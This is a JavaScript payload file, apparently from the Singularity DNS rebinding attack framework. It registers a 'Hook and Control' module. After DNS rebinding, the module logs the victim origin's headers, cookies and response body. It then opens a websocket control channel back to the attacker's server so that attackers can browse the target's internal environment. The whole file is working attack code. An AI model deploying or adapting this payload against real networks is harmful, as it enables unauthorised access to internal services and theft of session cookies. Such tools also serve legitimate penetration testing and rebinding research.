/**
This payload requests the target to establish a websocket control channel to Singularity server.
It then waits for commands from Singularity. Permits attackers to browse the target as if they 
were working from the target environment.
**/

const HookAndControl = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body, wsProxyPort) {
        if (headers !== null) {
            console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
        };
        if (cookie !== null) {
            console.log(`Origin: ${window.location} headers: ${cookie}`);
        };
        if (body !== null) {
            console.log(`Origin: ${window.location} body:\n${body}`);
        };

        // establish ws connection to Singularity server
			webSocketHook(headers, cookie, wsProxyPort, 10);
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return false;
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Hook and Control"] = HookAndControl();



